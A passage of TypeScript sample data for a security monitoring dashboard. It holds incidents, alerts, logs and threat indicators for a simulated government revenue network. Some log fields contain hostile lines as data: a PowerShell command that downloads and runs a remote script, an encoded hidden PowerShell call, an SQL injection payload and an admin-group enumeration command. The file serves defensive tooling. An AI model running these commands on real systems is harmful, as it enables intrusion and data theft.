    affectedAssets: ['DC01-HQ.revenue.gov.et', 'VPN-GW-ADDIS'],
    assignedAnalyst: 'Unassigned',
    source: 'Windows Active Directory Domain Controllers',
    summary: 'Over 180 Active Directory user accounts experienced coordinated single failed logon attempts with common passwords over 3 minutes.',
    description: 'EventCode 4625 spike logged across revenue.gov.et domain controllers. IP origin traced to external VPN gateway session pool.',
    relatedEventIds: ['EVT-9915', 'EVT-9916'],
    relatedAlertIds: ['ALT-803'],
    timeline: [
      {
        id: 'TL-40',
        timestamp: '2026-10-15 09:05:14',
        user: 'RULE-101 Detection',
        action: 'Incident auto-created',
        type: 'status_change'
      }
    ],
    notes: [],
    responseActions: []
  },
  {
    id: 'INC-2026-0036',
    title: 'DNS Tunneling Detected Targeting External Dynamic DNS Provider',
    severity: 'high',
    status: 'resolved',
    detectionTime: '2026-10-14 14:15:00',
    lastUpdated: '2026-10-14 17:30:00',
    affectedAssets: ['DNS-RESOLVER-01'],
    assignedAnalyst: 'Biks Biset',
    source: 'DNS and DHCP',
    summary: 'High-entropy TXT record requests observed from customs workstation to suspicious domain ns1.darkrouting-update.net.',
    description: 'Investigation confirmed unauthorized remote access tool testing by internal vendor. Host re-imaged and policy violation cited.',
    relatedEventIds: ['EVT-9701'],
    relatedAlertIds: ['ALT-780'],
    timeline: [
      {
        id: 'TL-50',
        timestamp: '2026-10-14 14:15:00',
        user: 'RULE-105 Detection',
        action: 'Incident created',
        type: 'status_change'
      },
      {
        id: 'TL-51',
        timestamp: '2026-10-14 17:30:00',
        user: 'Biks Biset',
        action: 'Incident resolved with post-incident remediation report',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-50',
        author: 'Biks Biset',
        role: 'SOC Analyst',
        timestamp: '2026-10-14 17:20:00',
        text: 'Host formatted and re-imaged with standard hardened Ministry Windows 11 SOE. DNS sinkhole applied for domain darkrouting-update.net.'
      }
    ],
    responseActions: [],
    closedResolution: {
      resolvedAt: '2026-10-14 17:30:00',
      resolvedBy: 'Biks Biset',
      rootCause: 'Contractor laptop running unauthorized diagnostic tool with embedded DNS tunneling protocol.',
      resolutionSummary: 'Device isolated and removed from network. Root domain blacklisted on all Ministry internal DNS forwarders.',
      preventativeAction: 'Enforce 802.1x Network Access Control posture check on all contractor devices before VLAN admission.'
    }
  },
  {
    id: 'INC-2026-0035',
    title: 'Phishing Campaign with Malicious Macro Targeting Customs Clearance Staff',
    severity: 'medium',
    status: 'closed',
    detectionTime: '2026-10-13 11:00:20',
    lastUpdated: '2026-10-13 16:40:00',
    affectedAssets: ['EXCHANGE-01.revenue.gov.et'],
    assignedAnalyst: 'Bethlehem Haile',
    source: 'Email security',
    summary: '28 inbound emails disguised as bill-of-lading documents containing weaponized macro attachments.',
    description: 'All 28 messages purged from Exchange mailboxes via automated compliance search. Zero users executed attachments.',
    relatedEventIds: ['EVT-9610'],
    relatedAlertIds: ['ALT-760'],
    timeline: [
      {
        id: 'TL-60',
        timestamp: '2026-10-13 11:00:20',
        user: 'Email Security Rule',
        action: 'Incident created',
        type: 'status_change'
      },
      {
        id: 'TL-61',
        timestamp: '2026-10-13 16:40:00',
        user: 'Bethlehem Haile',
        action: 'Closed after confirmation that all 28 emails purged',
        type: 'status_change'
      }
    ],
    notes: [],
    responseActions: [],
    closedResolution: {
      resolvedAt: '2026-10-13 16:40:00',
      resolvedBy: 'Bethlehem Haile',
      rootCause: 'Spoofed sender domain from external compromised supplier.',
      resolutionSummary: 'Exchange mailboxes purged, sender domain blacklisted, sender IP blocklisted at perimeter.',
      preventativeAction: 'Strengthen SPF/DKIM/DMARC reject policy on mail inbound gateways.'
    }
  }
];

export const INITIAL_ALERTS: Alert[] = [
  {
    id: 'ALT-801',
    title: 'Cobalt Strike Beaconing Pattern Detected',
    detectionRuleId: 'RULE-104',
    detectionRuleName: 'Cobalt Strike / Meterpreter Beaconing over Encrypted HTTPS',
    severity: 'critical',
    firstDetected: '2026-10-15 09:18:22',
    lastDetected: '2026-10-15 09:42:10',
    sourceSystem: 'Windows Endpoints',
    affectedAsset: 'WS-FINANCE-019',
    relatedIncidentId: 'INC-2026-0041',
    status: 'assigned',
    assignedTo: 'Biks Biset',
    eventCount: 42,
    evidence: [
      { label: 'Destination IP', value: '185.220.101.42 (Russia / Bulletproof hosting)' },
      { label: 'Outbound Port', value: '443 / TLS 1.3' },
      { label: 'Beaconing Jitter', value: '2.8% (Highly regular schedule)' },
      { label: 'Parent Process', value: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE' }
    ]
  },
  {
    id: 'ALT-802',
    title: 'Repeated SQL Injection in e-Tax Payment Verification Endpoint',
    detectionRuleId: 'RULE-103',
    detectionRuleName: 'SQL Injection Attack Signature on e-Tax Public Endpoints',
    severity: 'critical',
    firstDetected: '2026-10-15 09:22:15',
    lastDetected: '2026-10-15 09:44:00',
    sourceSystem: 'Web server and applications',
    affectedAsset: 'WEB-ETAX-PRD01',
    relatedIncidentId: 'INC-2026-0040',
    status: 'investigating',
    assignedTo: 'Bethlehem Haile',
    eventCount: 148,
    evidence: [
      { label: 'URI Endpoint', value: '/api/v1/taxpayer/verify' },
      { label: 'Injected Pattern', value: 'UNION SELECT 1,schema_name,version() FROM information_schema.schemata' },
      { label: 'WAF Action', value: '403 Forbidden (Blocked)' },
      { label: 'Source IP Cluster', value: '194.26.29.112, 45.154.255.89' }
    ]
  },
  {
    id: 'ALT-803',
    title: 'High-Volume Failed Active Directory Logins (Password Spray)',
    detectionRuleId: 'RULE-101',
    detectionRuleName: 'Multiple Failed Active Directory Logins Followed by Success',
    severity: 'high',
    firstDetected: '2026-10-15 09:05:14',
    lastDetected: '2026-10-15 09:12:00',
    sourceSystem: 'Active Directory',
    affectedAsset: 'DC01-HQ.revenue.gov.et',
    relatedIncidentId: 'INC-2026-0037',
    status: 'new',
    eventCount: 182,
    evidence: [
      { label: 'Event ID', value: '4625 (Logon Failure)' },
      { label: 'Sub-Status', value: '0xC000006A (Bad Password)' },
      { label: 'Accounts Targeted', value: '182 unique staff usernames' },
      { label: 'Origin IP', value: '10.100.120.44 (Internal VPN subnet)' }
    ]
  },
  {
    id: 'ALT-804',
    title: 'Suspicious PowerShell Execution with Encoded Command',
    detectionRuleId: 'RULE-106',
    detectionRuleName: 'Suspicious PowerShell Execution with Encoded Command',
    severity: 'high',
    firstDetected: '2026-10-15 09:17:50',
    lastDetected: '2026-10-15 09:17:50',
    sourceSystem: 'Windows Endpoints',
    affectedAsset: 'WS-FINANCE-019',
    relatedIncidentId: 'INC-2026-0041',
    status: 'assigned',
    assignedTo: 'Biks Biset',
    eventCount: 3,
    evidence: [
      { label: 'Process Name', value: 'powershell.exe' },
      { label: 'Command Line', value: 'powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAu...' },
      { label: 'Spawned By', value: 'WINWORD.EXE' },
      { label: 'User Context', value: 'revenue\\tadesse.b' }
    ]
  },
  {
    id: 'ALT-805',
    title: 'Anomalous Database Query Volume on SIGTAS Production Database',
    detectionRuleId: 'RULE-107',
    detectionRuleName: 'Mass Revenue Record Export / Anomalous Data Transfer',
    severity: 'high',
    firstDetected: '2026-10-15 06:40:11',
    lastDetected: '2026-10-15 06:55:00',
    sourceSystem: 'Database servers',
    affectedAsset: 'DB-TAX-01.revenue.gov.et',
    status: 'acknowledged',
    assignedTo: 'Endale Aychew',
    eventCount: 12,
    evidence: [
      { label: 'Database Name', value: 'sigtas_prod_db' },
      { label: 'Rows Returned', value: '84,200 records' },
      { label: 'Query Table', value: 'tbl_taxpayer_audit_histories' },
      { label: 'DB User', value: 'auditor_service_role' }
    ]
  },
  {
    id: 'ALT-806',
    title: 'DNS Tunneling Indicators towards Unregistered Nameserver',
    detectionRuleId: 'RULE-105',
    detectionRuleName: 'DNS Tunneling and Data Exfiltration Activity',
    severity: 'medium',
    firstDetected: '2026-10-15 08:40:19',
    lastDetected: '2026-10-15 08:55:22',
    sourceSystem: 'DNS and DHCP',
    affectedAsset: 'DNS-RESOLVER-01',
    status: 'new',
    eventCount: 310,
    evidence: [
      { label: 'Record Type', value: 'TXT / NULL query' },
      { label: 'Average Entropy', value: '4.82 bits/byte' },
      { label: 'Target Domain', value: 'sync.dnscache-update.top' }
    ]
  },
  {
    id: 'ALT-807',
    title: 'Concurrent VPN Logins from Addis Ababa and Frankfurt',
    detectionRuleId: 'RULE-108',
    detectionRuleName: 'Concurrent VPN Logins from Geographically Disparate Locations',
    severity: 'medium',
    firstDetected: '2026-10-15 07:15:30',
    lastDetected: '2026-10-15 07:15:30',
    sourceSystem: 'VPN',
    affectedAsset: 'VPN-GW-ADDIS',
    status: 'acknowledged',
    assignedTo: 'Bethlehem Haile',
    eventCount: 2,
    evidence: [
      { label: 'Username', value: 'almaz.g@revenue.gov.et' },
      { label: 'Session 1', value: '196.188.12.18 (Ethio Telecom, Addis Ababa)' },
      { label: 'Session 2', value: '185.191.171.12 (Frankfurt, Germany)' },
      { label: 'Delta', value: 'Simultaneous connection' }
    ]
  },
  {
    id: 'ALT-808',
    title: 'Suspicious Port Scan Originating from Customs Subnet',
    detectionRuleId: 'RULE-104',
    detectionRuleName: 'Port Sweep and Network Reconnaissance',
    severity: 'low',
    firstDetected: '2026-10-15 08:10:00',
    lastDetected: '2026-10-15 08:14:00',
    sourceSystem: 'Routers and switches',
    affectedAsset: 'SW-DIST-REG',
    status: 'false_positive',
    falsePositiveReason: 'Authorized Nessus vulnerability assessment scan conducted by Directorate Security team ticket #SEC-9921',
    falsePositiveBy: 'Endale Aychew',
    eventCount: 4200,
    evidence: [
      { label: 'Scanner Host', value: '10.100.10.99 (Vulnerability Scanner)' },
      { label: 'Ports Probed', value: '1-1024 / TCP SYN' }
    ]
  },
  {
    id: 'ALT-809',
    title: 'Log Collector Ingestion Timeout: Mekelle Branch',
    detectionRuleId: 'RULE-109',
    detectionRuleName: 'Security Log Source Silenced or Abruptly Terminated',
    severity: 'high',
    firstDetected: '2026-10-15 09:20:10',
    lastDetected: '2026-10-15 09:45:00',
    sourceSystem: 'Log Management Engine',
    affectedAsset: 'LOG-PROXY-MEKELLE',
    relatedIncidentId: 'INC-2026-0038',
    status: 'investigating',
    assignedTo: 'Biks Biset',
    eventCount: 1,
    evidence: [
      { label: 'Source Name', value: 'Mekelle Branch Regional Log Collector Proxy' },
      { label: 'Expected EPS', value: '150 EPS' },
      { label: 'Observed EPS', value: '0 EPS for > 25 mins' }
    ]
  }
];

export const INITIAL_SECURITY_EVENTS: SecurityEvent[] = [
  {
    id: 'EVT-9928',
    timestamp: '2026-10-15 09:44:02',
    sourceName: 'Core Perimeter Firewalls (HA Cluster)',
    sourceType: 'Firewall',
    hostname: 'FW-PERIMETER-01',
    srcIp: '10.100.40.88',
    destIp: '185.220.101.42',
    category: 'Network',
    severity: 'critical',
    originalMessage: '<134>1 2026-10-15T09:44:02.000+03:00 FW-PERIMETER-01 1 2026/10/15 09:44:02 001B17003E99 TRAFFIC drop 2304 2026/10/15 09:44:02 10.100.40.88 185.220.101.42 0.0.0.0 0.0.0.0 rule_c2_block ssl tcp 49822 443 0 0 0x0 trust untrust rule_c2_block 0 0 0 0 0 0 0 0 0 0',
    normalizedFields: {
      action: 'DENY_DROP',
      protocol: 'TCP',
      port: 443,
      ruleTriggered: 'SOC-BLOCK-185.220.101.42',
      processName: 'powershell.exe',
      bytesTransferred: 0
    },
    relatedAlertId: 'ALT-801',
    relatedIncidentId: 'INC-2026-0041',
    collectionTimestamp: '2026-10-15 09:44:03',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9927',
    timestamp: '2026-10-15 09:43:18',
    sourceName: 'e-Tax Public Web Application & API Gateways',
    sourceType: 'Web server and applications',
    hostname: 'WEB-ETAX-PRD01',
    srcIp: '194.26.29.112',
    destIp: '10.100.30.20',
    category: 'Web Application',
    severity: 'critical',
    originalMessage: '194.26.29.112 - - [15/Oct/2026:09:43:18 +0300] "GET /api/v1/taxpayer/verify?tin=%27%20UNION%20SELECT%201,schema_name,version()%20FROM%20information_schema.schemata-- HTTP/1.1" 403 218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.8#stable"',
    normalizedFields: {
      action: 'BLOCKED',
      statusCode: 403,
      userAgent: 'sqlmap/1.8#stable',
      targetResource: '/api/v1/taxpayer/verify',
      ruleTriggered: 'RULE-103-WAF-SQLI'
    },
    relatedAlertId: 'ALT-802',
    relatedIncidentId: 'INC-2026-0040',
    collectionTimestamp: '2026-10-15 09:43:19',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9926',
    timestamp: '2026-10-15 09:41:50',
    sourceName: 'Windows Endpoints (Workstations & Laptops)',
    sourceType: 'Windows endpoints',
    hostname: 'WS-FINANCE-019',
    username: 'revenue\\tadesse.b',
    srcIp: '10.100.40.88',
    category: 'Malware',
    severity: 'critical',
    originalMessage: 'EventID: 1116, Provider: Microsoft-Windows-Windows Defender, Message: Antivirus has detected malware or other potentially unwanted software. Name: Trojan:Win32/CobaltStrike.ST!dha, Path: file:C:\\Users\\tadesse.b\\AppData\\Local\\Microsoft\\Windows\\UpdHost.dll, Action: Quarantine',
    normalizedFields: {
      action: 'QUARANTINED',
      processName: 'UpdHost.dll',
      fileHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      processId: 4128
    },
    relatedAlertId: 'ALT-801',
    relatedIncidentId: 'INC-2026-0041',
    collectionTimestamp: '2026-10-15 09:41:52',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9925',
    timestamp: '2026-10-15 09:39:10',
    sourceName: 'Windows Active Directory Domain Controllers',
    sourceType: 'Active Directory',
    hostname: 'DC01-HQ.revenue.gov.et',
    username: 'revenue\\svc_backup',
    srcIp: '10.100.12.18',
    destIp: '10.100.10.10',
    category: 'Authentication',
    severity: 'medium',
    originalMessage: 'EventID: 4624, Level: Information, Provider: Microsoft-Windows-Security-Auditing, Description: An account was successfully logged on. TargetUserName: svc_backup, TargetDomainName: REVENUE, LogonType: 3 (Network), AuthenticationPackageName: Kerberos',
    normalizedFields: {
      action: 'LOGON_SUCCESS',
      authMethod: 'Kerberos',
      protocol: 'Kerberos/v5',
      port: 88
    },
    collectionTimestamp: '2026-10-15 09:39:11',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9924',
    timestamp: '2026-10-15 09:31:04',
    sourceName: 'Windows Endpoints (Workstations & Laptops)',
    sourceType: 'Windows endpoints',
    hostname: 'WS-FINANCE-019',
    username: 'revenue\\tadesse.b',
    srcIp: '10.100.40.88',
    destIp: '10.100.20.15',
    category: 'Endpoint',
    severity: 'high',
    originalMessage: 'EventID: 4688, Provider: Microsoft-Windows-Security-Auditing, New Process Name: C:\\Windows\\System32\\cmd.exe, CommandLine: cmd.exe /c net group "Domain Admins" /domain',
    normalizedFields: {
      action: 'PROCESS_CREATE',
      processName: 'cmd.exe',
      processId: 5824,
      ruleTriggered: 'RECON_NET_GROUP_ENUM'
    },
    relatedAlertId: 'ALT-804',
    relatedIncidentId: 'INC-2026-0041',
    collectionTimestamp: '2026-10-15 09:31:05',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9923',
    timestamp: '2026-10-15 09:28:11',
    sourceName: 'DNS & DHCP Authority Servers',
    sourceType: 'DNS and DHCP',
    hostname: 'DNS-RESOLVER-01',
    srcIp: '10.100.40.88',
    destIp: '10.100.10.2',
    category: 'DNS and DHCP',
    severity: 'high',
    originalMessage: 'named[1844]: client @0x7f4820 10.100.40.88#51234 (sync.dnscache-update.top): query: sync.dnscache-update.top IN TXT + (10.100.10.2)',
    normalizedFields: {
      protocol: 'UDP',
      port: 53,
      targetResource: 'sync.dnscache-update.top',
      action: 'QUERY_RESOLVED'
    },
    relatedAlertId: 'ALT-806',
    collectionTimestamp: '2026-10-15 09:28:12',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9922',
    timestamp: '2026-10-15 09:17:50',
    sourceName: 'Windows Endpoints (Workstations & Laptops)',
    sourceType: 'Windows endpoints',
    hostname: 'WS-FINANCE-019',
    username: 'revenue\\tadesse.b',
    category: 'Endpoint',
    severity: 'high',
    originalMessage: 'EventID: 4104, Provider: Microsoft-Windows-PowerShell, ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString("https://185.220.101.42/payload.ps1")',
    normalizedFields: {
      action: 'SCRIPT_EXEC',
      processName: 'powershell.exe',
      processId: 3940,
      ruleTriggered: 'RULE-106'
    },
    relatedAlertId: 'ALT-804',
    relatedIncidentId: 'INC-2026-0041',
    collectionTimestamp: '2026-10-15 09:17:51',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9921',
    timestamp: '2026-10-15 09:16:30',
    sourceName: 'Microsoft Exchange & Mail Protection Gateway',
    sourceType: 'Email security',
    hostname: 'EXCHANGE-01.revenue.gov.et',
    username: 'tadesse.b@revenue.gov.et',
    srcIp: '185.191.171.8',
    category: 'System',
    severity: 'medium',
    originalMessage: 'ExchangeHub: MessageReceived MessageId: <202610150616.x418@external-supplier.com> Subject: "VAT Reconciliation Q3 Clarifications" Sender: claims@external-tax-audit.org Recipient: tadesse.b@revenue.gov.et Attachment: VAT_Reconciliation_Q3_Clarifications.docx (148KB)',
    normalizedFields: {
      action: 'DELIVERED',
      targetResource: 'VAT_Reconciliation_Q3_Clarifications.docx',
      protocol: 'SMTP'
    },
    relatedIncidentId: 'INC-2026-0041',
    collectionTimestamp: '2026-10-15 09:16:32',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9920',
    timestamp: '2026-10-15 09:11:45',
    sourceName: 'Windows Active Directory Domain Controllers',
    sourceType: 'Active Directory',
    hostname: 'DC01-HQ.revenue.gov.et',
    username: 'revenue\\almaz.k',
    srcIp: '10.100.120.44',
    destIp: '10.100.10.10',
    category: 'Authentication',
    severity: 'high',
    originalMessage: 'EventID: 4625, Provider: Microsoft-Windows-Security-Auditing, Description: An account failed to log on. TargetUserName: almaz.k, FailureReason: Unknown user name or bad password (0xC000006A), LogonType: 3 (Network)',
    normalizedFields: {
      action: 'LOGON_FAILED',
      authMethod: 'NTLMv2',
      statusCode: 4625
    },
    relatedAlertId: 'ALT-803',
    relatedIncidentId: 'INC-2026-0037',
    collectionTimestamp: '2026-10-15 09:11:46',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9919',
    timestamp: '2026-10-15 09:08:20',
    sourceName: 'Fortinet SSL-VPN Remote Access Gateways',
    sourceType: 'VPN',
    hostname: 'VPN-GW-ADDIS',
    username: 'solomon.k',
    srcIp: '196.188.12.4',
    category: 'Authentication',
    severity: 'info',
    originalMessage: 'date=2026-10-15 time=09:08:20 devname=VPN-GW-ADDIS type="traffic" subtype="vpn" level="notice" action="tunnel-up" remip=196.188.12.4 tunneltype="ssl-vpn" tunnelid=102839 user="solomon.k" group="Field_Auditors" msg="SSL tunnel established"',
    normalizedFields: {
      action: 'VPN_TUNNEL_UP',
      protocol: 'TLS',
      authMethod: 'MFA_TOTP'
    },
    collectionTimestamp: '2026-10-15 09:08:21',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9918',
    timestamp: '2026-10-15 09:01:05',
    sourceName: 'SIGTAS Database Servers (PostgreSQL & Oracle RAC)',
    sourceType: 'Database servers',
    hostname: 'DB-TAX-01.revenue.gov.et',
    username: 'tax_api_app',
    srcIp: '10.100.30.20',
    destIp: '10.100.20.15',
    category: 'System',
    severity: 'info',
    originalMessage: '2026-10-15 09:01:05.122 EAT [12991] tax_api_app@sigtas_prod_db LOG: statement: SELECT tin, legal_name, tax_center_code FROM taxpayers WHERE tin = \'0098241198\' LIMIT 1;',
    normalizedFields: {
      action: 'SELECT',
      protocol: 'TCP',
      port: 5432,
      targetResource: 'taxpayers'
    },
    collectionTimestamp: '2026-10-15 09:01:06',
    parsingStatus: 'parsed'
  },
  {
    id: 'EVT-9917',
    timestamp: '2026-10-15 08:52:40',
    sourceName: 'Core Perimeter Firewalls (HA Cluster)',
    sourceType: 'Firewall',
    hostname: 'FW-PERIMETER-01',
    srcIp: '103.145.12.18',
    destIp: '196.188.120.5',
    category: 'Network',
    severity: 'medium',
    originalMessage: 'Oct 15 08:52:40 FW-PERIMETER-01 1,2026/10/15 08:52:40,001B17003E99,THREAT,vulnerability,2304,2026/10/15 08:52:40,103.145.12.18,196.188.120.5,0.0.0.0,0.0.0.0,VPN-Perimeter,untrust,trust,ssl,vsys1,client-to-server,Fortinet SSL-VPN Path Traversal Attempt(40882),443,tcp',
    normalizedFields: {
      action: 'RESET_SERVER',
      protocol: 'TCP',
      port: 443,
      ruleTriggered: 'CVE-2024-21762-SIG'
    },
    collectionTimestamp: '2026-10-15 08:52:41',
    parsingStatus: 'parsed'
  }
];

export const INITIAL_THREAT_INDICATORS: ThreatIndicator[] = [
  {
    id: 'THREAT-101',
    type: 'ip',
    value: '185.220.101.42',
    source: 'Ministry CIRT Intelligence / MISP Feed',
    firstObserved: '2026-10-12 14:00:00',
    lastObserved: '2026-10-15 09:44:02',
    confidence: 96,
    riskRating: 'critical',
    relatedEventsCount: 42,
    expirationDate: '2026-11-15',
    description: 'Active Cobalt Strike Command and Control endpoint hosted on offshore non-compliant bulletproof ASN 48693.'
  },
  {
    id: 'THREAT-102',
    type: 'ip',
    value: '194.26.29.112',
    source: 'e-Tax WAF Automated Blacklist',
    firstObserved: '2026-10-15 07:44:00',
    lastObserved: '2026-10-15 09:43:18',
    confidence: 90,
    riskRating: 'critical',
    relatedEventsCount: 148,
    expirationDate: '2026-10-22',
    description: 'Automated SQL injection and directory scanner targeting African governmental revenue portals.'
  },
  {
    id: 'THREAT-103',
    type: 'domain',
    value: 'sync.dnscache-update.top',
    source: 'DNS Threat Sentinel / CERT-ET Alert',
    firstObserved: '2026-10-14 09:10:00',
    lastObserved: '2026-10-15 09:28:11',
    confidence: 88,
    riskRating: 'high',
    relatedEventsCount: 310,
    expirationDate: '2026-11-01',
    description: 'Dynamic DNS domain registered 3 days ago used for command staging and DNS tunneling payload distribution.'
  },
  {
    id: 'THREAT-104',
    type: 'hash',
    value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    source: 'Internal Forensic Artifact Analysis',
    firstObserved: '2026-10-15 09:18:00',
    lastObserved: '2026-10-15 09:41:50',
    confidence: 98,
    riskRating: 'critical',
    relatedEventsCount: 4,
    expirationDate: '2027-10-15',
    description: 'SHA-256 hash of malicious staging DLL UpdHost.dll weaponized with reflective loader.'
  },
  {
    id: 'THREAT-105',
    type: 'url',
    value: 'https://secure-rev-gov-et.portal-check.net/auth/login.php',
    source: 'Anti-Phishing Working Group (APWG)',
    firstObserved: '2026-10-11 11:20:00',
    lastObserved: '2026-10-14 18:00:00',
    confidence: 94,
    riskRating: 'high',
    relatedEventsCount: 18,
    expirationDate: '2026-11-10',
    description: 'Credential harvesting site mimicking Ministry of Revenue internal webmail single-sign-on login page.'
  },
  {
    id: 'THREAT-106',
    type: 'ip',
    value: '45.154.255.89',
    source: 'Perimeter IDS Feed',
    firstObserved: '2026-10-15 07:50:00',
    lastObserved: '2026-10-15 08:30:00',
    confidence: 82,
    riskRating: 'high',
    relatedEventsCount: 64,
    expirationDate: '2026-10-25',
    description: 'Proxy IP executing automated brute force and credential stuffing against SSL-VPN service.'
  }
];

export const INITIAL_AUDIT_LOGS: AuditLog[] = [
  {
    id: 'AUD-901',
    timestamp: '2026-10-15 09:38:10',
    user: 'Bethlehem Haile',
    role: 'Incident Responder',
    action: 'Network Isolation Executed',
    target: 'Asset: WS-FINANCE-019 (IP: 10.100.40.88)',
    result: 'Success',
    details: 'Isolated finance host from corporate LAN pursuant to Incident INC-2026-0041 containment.'
  },
  {
    id: 'AUD-902',
    timestamp: '2026-10-15 09:32:00',
    user: 'Biks Biset',
    role: 'SOC Analyst',
    action: 'Perimeter Firewall Block Rule Added',
    target: 'FW-PERIMETER-01: Rule SOC-BLOCK-185.220.101.42',
    result: 'Success',
    details: 'Blocked outbound C2 communication to external IP 185.220.101.42.'
  },
  {
    id: 'AUD-903',
    timestamp: '2026-10-15 09:28:44',
    user: 'Biks Biset',
    role: 'SOC Analyst',
    action: 'Incident Severity Modified',
    target: 'Incident: INC-2026-0041',
    result: 'Success',
    details: 'Severity changed from High to Critical due to confirmed lateral Reconnaissance.'
  },
  {
    id: 'AUD-904',
    timestamp: '2026-10-15 08:30:11',
    user: 'Endale Aychew',
    role: 'Security Administrator',
    action: 'Active Directory Account Disabled',
    target: 'User: cont_samuel.k',
    result: 'Success',
    details: 'Account disabled after unauthorized privilege escalation attempt on DC01-HQ.'
  },
  {
    id: 'AUD-905',
    timestamp: '2026-10-15 08:02:44',
    user: 'Bethlehem Haile',
    role: 'Incident Responder',
    action: 'WAF Rate Limiting Policy Updated',
    target: 'WEB-ETAX-PRD01 (/api/v1/taxpayer/*)',
    result: 'Success',
    details: 'Applied aggressive token bucket rate limiting on e-Tax taxpayer endpoints.'
  },
  {
    id: 'AUD-906',
    timestamp: '2026-10-15 07:10:00',
    user: 'Endale Aychew',
    role: 'Security Administrator',
    action: 'Detection Rule Tested',
    target: 'Rule: RULE-103 (SQL Injection)',
    result: 'Success',
    details: 'Verified regex match against 50 sample payloads in sandbox verification test.'
  }
];

export const INITIAL_NETWORK_FLOWS: NetworkFlow[] = [
  {
    id: 'FLOW-1',
    timestamp: '09:44:02',
    srcIp: '10.100.40.88',
    destIp: '185.220.101.42',
    protocol: 'TCP',
    port: 443,
    bytes: 1420,
    action: 'BLOCK',
    device: 'FW-PERIMETER-01',
    flag: 'C2_SIGNATURE_DROP'
  },
  {
    id: 'FLOW-2',
    timestamp: '09:43:58',
    srcIp: '196.188.12.18',
    destIp: '196.188.120.5',
    protocol: 'TLS',
    port: 443,
    bytes: 124500,
    action: 'ALLOW',
    device: 'VPN-GW-ADDIS',
    flag: 'VPN_SESSION'
  },
  {
    id: 'FLOW-3',
    timestamp: '09:43:40',
    srcIp: '194.26.29.112',
    destIp: '10.100.30.20',
    protocol: 'TCP',
    port: 443,
    bytes: 420,
    action: 'BLOCK',
    device: 'WEB-ETAX-PRD01',
    flag: 'WAF_SQLI_DROP'
  },
  {
    id: 'FLOW-4',
    timestamp: '09:43:10',
    srcIp: '10.100.10.10',
    destIp: '10.100.10.2',
    protocol: 'UDP',
    port: 53,
    bytes: 98,
    action: 'ALLOW',
    device: 'DNS-RESOLVER-01'
  },
  {
    id: 'FLOW-5',
    timestamp: '09:42:55',
    srcIp: '10.100.30.20',
    destIp: '10.100.20.15',
    protocol: 'TCP',
    port: 5432,
    bytes: 8420,
    action: 'ALLOW',
    device: 'DB-TAX-01'
  },
  {
    id: 'FLOW-6',
    timestamp: '09:42:01',
    srcIp: '103.145.12.18',
    destIp: '196.188.120.5',
    protocol: 'TCP',
    port: 443,
    bytes: 890,
    action: 'BLOCK',
    device: 'FW-PERIMETER-01',
    flag: 'EXPLOIT_PAYLOAD'
  }
];

export const SYSTEM_HEALTH_DATA: SystemHealthMetrics = {
  overallStatus: 'Healthy',
  collectorsOnline: 13,
  collectorsTotal: 14,
  agentsReporting: 1834,
  agentsTotal: 1840,
  ingestionRateEPS: 14850,
  storageUsageTB: 68.4,
  storageCapacityTB: 120.0,
  retentionDays: 180,
  lastSuccessfulIngestion: 'Just now (< 2s ago)'
};

/**
 * Metric profiles for the 4 time ranges:
 * - Last 24 Hours
 * - Last 15 Days
 * - Last Month
 * - Last 3 Months
 */
export const METRICS_BY_TIMERANGE: Record<TimeRangeOption, TimeRangeMetrics> = {
  'Last 24 Hours': {
    totalEvents: 1482910,
    totalEventsChangePct: 4.2,
    criticalEvents: 48,
    highEvents: 312,
    securityIncidents: 7,
    incidentsChangePct: 16.7,
    eventsOverTime: [
      { time: '10:00', total: 61200, critical: 1, high: 12 },
      { time: '12:00', total: 68400, critical: 2, high: 15 },
      { time: '14:00', total: 74200, critical: 4, high: 18 },
      { time: '16:00', total: 69100, critical: 3, high: 14 },
      { time: '18:00', total: 54300, critical: 2, high: 9 },
      { time: '20:00', total: 42100, critical: 1, high: 8 },
      { time: '22:00', total: 38900, critical: 3, high: 11 },
      { time: '00:00', total: 32400, critical: 2, high: 7 },
      { time: '02:00', total: 29800, critical: 1, high: 6 },
      { time: '04:00', total: 31500, critical: 2, high: 8 },
      { time: '06:00', total: 48900, critical: 5, high: 22 },
      { time: '08:00', total: 82400, critical: 14, high: 45 },
      { time: '09:00', total: 89100, critical: 8, high: 37 }
    ],
    eventTypesBreakdown: [
      { category: 'Authentication', count: 489200, percentage: 33, color: '#3B82F6' },
      { category: 'Network', count: 370720, percentage: 25, color: '#06B6D4' },
      { category: 'Malware', count: 177950, percentage: 12, color: '#EF4444' },
      { category: 'Web Application', count: 148290, percentage: 10, color: '#F97316' },
      { category: 'System', count: 118630, percentage: 8, color: '#8B5CF6' },
      { category: 'Endpoint', count: 88970, percentage: 6, color: '#10B981' },
      { category: 'DNS and DHCP', count: 59320, percentage: 4, color: '#F59E0B' },
      { category: 'Other', count: 29830, percentage: 2, color: '#64748B' }
    ],
    topThreatCategories: [
      { category: 'Brute-force attempts', count: 8420, percentage: 28 },
      { category: 'Malware detection', count: 5610, percentage: 19 },
      { category: 'Suspicious login activity', count: 4890, percentage: 16 },
      { category: 'Web application attacks', count: 4120, percentage: 14 },
      { category: 'Unusual outbound traffic', count: 2780, percentage: 9 },
      { category: 'Data exfiltration indicators', count: 1840, percentage: 6 },
      { category: 'Privilege escalation indicators', count: 1210, percentage: 4 },
      { category: 'Suspicious DNS activity', count: 1190, percentage: 4 }
    ],
    eventsBySource: [
      { source: 'Windows endpoints', count: 341200, percentage: 23.0, status: 'healthy' },
